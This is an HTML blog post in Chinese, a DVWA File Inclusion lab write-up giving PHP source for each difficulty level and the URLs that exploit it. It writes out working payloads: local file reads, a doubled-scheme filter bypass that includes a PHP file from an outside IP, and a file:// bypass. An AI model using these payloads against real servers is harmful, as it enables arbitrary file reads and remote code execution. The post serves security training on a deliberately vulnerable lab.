@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>Dvwa 文件包含漏洞（File Inclusion） | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    Dvwa 文件包含漏洞（File Inclusion）
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Dvwa-文件包含漏洞（File-Inclusion）"><span class="toc-number">1.</span> <span class="toc-text">Dvwa 文件包含漏洞（File Inclusion）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#文件包含分为两类："><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">文件包含分为两类：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#某些特性函数"><span class="toc-number">1.0.0.0.2.</span> <span class="toc-text">某些特性函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#low级别"><span class="toc-number">1.1.</span> <span class="toc-text">low级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码："><span class="toc-number">1.1.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战："><span class="toc-number">1.1.0.2.</span> <span class="toc-text">实战：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium级别"><span class="toc-number">1.2.</span> <span class="toc-text">medium级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码：-1"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战：-1"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">实战：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high级别"><span class="toc-number">1.3.</span> <span class="toc-text">high级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码：-2"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实战：-2"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">实战：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible级别"><span class="toc-number">1.4.</span> <span class="toc-text">impossible级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#源码：-3"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">源码：</span></a></li></ol></li></ol></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="Dvwa-文件包含漏洞（File-Inclusion）"><a href="#Dvwa-文件包含漏洞（File-Inclusion）" class="headerlink" title="Dvwa 文件包含漏洞（File Inclusion）"></a>Dvwa 文件包含漏洞（File Inclusion）</h1><p>原理理解参考链接：<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
+<p><strong>File Inclusion</strong>，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数，利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。<br>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p>
+<p>1、文件包含即程序通过包含函数调用本地或远程文件，以此来实现拓展功能<br>2、被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞。</p>
+<p>3、文件包含漏洞主要发生在有包含语句的环境中，例如PHP所具备include、require等函数。</p>
+<h5 id="文件包含分为两类："><a href="#文件包含分为两类：" class="headerlink" title="文件包含分为两类："></a>文件包含分为两类：</h5><p>本地文件包含LFI（local file include）当被包含的文件在服务器本地时，就形成本地文件包含<br>远程文件包含RFI（remote file include）当被包含的文件在第三方服务器时，叫做远程文件包含。</p>
+<h5 id="某些特性函数"><a href="#某些特性函数" class="headerlink" title="某些特性函数"></a>某些特性函数</h5><p>require:找不到被包含的文件，报错，并且停止运行脚本。<br>include:找不到被包含的文件,只会报错，但会继续运行脚本。<br>require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
+<p>include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
+<p><strong>相关的 php.ini 配置参数：</strong></p>
+<p>allow_url_fopen = on （默认开启）<br>allow_url_include = on （默认关闭）</p>
+<p>远程文件包含是因为开启了 php 配置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<p>参考链接：<a href="https://www.cnblogs.com/leeqizhi/p/11469943.html" target="_blank" rel="noopener">https://www.cnblogs.com/leeqizhi/p/11469943.html</a> <a href="https://www.cnblogs.com/heiwa-0924/p/12457423.html" target="_blank" rel="noopener">https://www.cnblogs.com/heiwa-0924/p/12457423.html</a></p>
+<h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+//$_GET数组复中传递的是通过制url传递的值，page是数组度的下标
+//如：url为http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=1&amp;id=2
+//那么传递过道来的$_GET数组中: $_GET[&#39;page&#39;]=1  $_GET[&#39;id&#39;]=2
+
+?&gt; </code></pre>
+<p>服务器端对page参数没有做任何的过滤跟检查。服务器希望用户点击图中的三个链接，服务器会包含相应文件，并将结果返回。需要说明的是。不管文件后缀是否是php，都会当做php文件执行，如果文件内容确认为php，则正常执行并返回结果，如果不是，则返回打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<h4 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h4><p>1、点击file1.php后，url为<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file1.php</code></p>
+<p>2、在F盘新建一个123.txt文件内容为helloworld,更改url：<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=F:\123.txt</code>发现屏幕上方显示了helloworld，即成功读取。新建php文件并修改url也是同等效果。</p>
+<h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+// Input validation
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+
+?&gt; </code></pre>
+<p>str_replace(find,replace,string,count)： 以其他字符替换字符串中的一些字符（区分大小写）。<br>find<br>必需。规定要查找的值。<br>replace<br>必需。规定替换 find 中的值的值。<br>string<br>必需。规定被搜索的字符串。<br>count<br>可选。对替换数进行计数的变量。</p>
+<p>从源码中可以看到http://、https://、../、..\会被替换为空字符，可以用双写绕过。同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的，采用绝对路径的办法不受影响。所以我们的语句也与上面基本相同，只是在被替换的地方双写一下即可</p>
+<h4 id="实战：-1"><a href="#实战：-1" class="headerlink" title="实战："></a>实战：</h4><p>本地包含：low级别的url在medium级别仍旧可以用。</p>
+<p>远程包含：我把1.php传到服务器的root目录底下，因此url改为</p>
+<p><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=htthttp://p://121.199.51.153/root/1.php</code></p>
+<p>出错提示：</p>
+<p><strong>Warning</strong>:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p>
+<p> <strong>Warning</strong>:  include(<a href="http://121.199.51.153/root/1.php" target="_blank" rel="noopener">http://121.199.51.153/root/1.php</a>): failed to open stream: no suitable wrapper could be found in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p>
+<p> <strong>Warning</strong>:  include(): Failed opening  ‘<a href="http://121.199.51.153/root/1.php&#39;" target="_blank" rel="noopener">http://121.199.51.153/root/1.php&#39;</a> for inclusion  (include_path=’.;C:\php\pear;../../external/phpids/0.6/lib/‘) in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p>
+<p>尝试的法1：<a href="http://www.voidcn.com/article/p-ddodmxtt-buo.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ddodmxtt-buo.html</a></p>
+<p>尝试的法2：想在远程服务器里编辑php.ini，结果报错</p>
+<p>root@iZbp1342kjcxfvbybtm200Z:<del># find / -name php.ini<br>/etc/php/7.0/apache2/php.ini<br>/etc/php/7.0/cli/php.ini<br>root@iZbp1342kjcxfvbybtm200Z:</del># vim /etc/php5/cgi/php.ini<br>Error detected while processing /usr/share/vim/vimrc:<br>line   20:<br>E484: Can’t open file /usr/share/vim/vim81/syntax/syntax.vim</p>
+<p>应该是vim的问题，彻底卸载重装vim：<a href="https://blog.csdn.net/violet_echo_0908/article/details/103311621还是会出现E484，进行多方查找无解，放弃" target="_blank" rel="noopener">https://blog.csdn.net/violet_echo_0908/article/details/103311621还是会出现E484，进行多方查找无解，放弃</a></p>
+<p>尝试的法3：可能是Apache的问题，点击本地Apache的php.ini，发现allow_url_include=Off，修改成on，仍旧报错（<a href="https://blog.csdn.net/bfboys/article/details/52486016），偶然知道可能得重启（https://www.cnblogs.com/chenhuanBlogs/p/10348557.html），遂重启，确实不再报allow_url_include=0的错" target="_blank" rel="noopener">https://blog.csdn.net/bfboys/article/details/52486016），偶然知道可能得重启（https://www.cnblogs.com/chenhuanBlogs/p/10348557.html），遂重启，确实不再报allow_url_include=0的错</a></p>
+<p>报错内容变为：</p>
+<p><strong>Warning</strong>:  include(<a href="http://121.199.51.153/root/1.php" target="_blank" rel="noopener">http://121.199.51.153/root/1.php</a>): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p>
+<p> <strong>Warning</strong>:  include(): Failed opening  ‘<a href="http://121.199.51.153/root/1.php&#39;" target="_blank" rel="noopener">http://121.199.51.153/root/1.php&#39;</a> for inclusion  (include_path=’.;C:\php\pear;../../external/phpids/0.6/lib/‘) in <strong>D:\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi\index.php</strong> on line <strong>36</strong></p>
+<p>意思应该为路径错误，才想到自己根本就没把1.php放在根目录下，把1.php放到根目录下边，然后url改为<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=htthttp://p://121.199.51.153/1.php</code> 成功包含。</p>
+<h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+// Input validation文件如果不是include.php就得是file开头的文件
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
+    // This isn&#39;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt; </code></pre>
+<p>代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<p>fnmatch(pattern,string,flags)函数根据指定的模式来匹配文件名或字符串。<br>pattern<br>必需。规定要检索的模式。<br>string<br>必需。规定要检查的字符串或文件。<br>flags<br>可选。</p>
+<p>我们可以利用file协议绕过防护策略。当我们用浏览器打开一个本地文件时，用的就是file协议。（file-本地传输协议 主要用于访问本地计算机中的文件）<br>file:///path 这个可以直接访问文件(file://也行)</p>
+<h4 id="实战：-2"><a href="#实战：-2" class="headerlink" title="实战："></a>实战：</h4><p>输入<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file:///F:\1.php</code></p>
+<p>file后边是路径，成功包含。</p>
+<p>（备注：至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件(需要知道上传文件的绝对路径),从而实现任意命令执行。）</p>
+<h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {
+    // This isn&#39;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exiphpt;
+}
+
+?&gt; </code></pre>
+<p>代码直接限制了page的参数，没法再攻击。</p>
+<p>参考链接：<a href="https://www.cnblogs.com/yyxianren/p/11381111.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyxianren/p/11381111.html</a></p>
+<p><a href="https://www.cnblogs.com/Loong716/p/10391324.html" target="_blank" rel="noopener">https://www.cnblogs.com/Loong716/p/10391324.html</a></p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-16</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
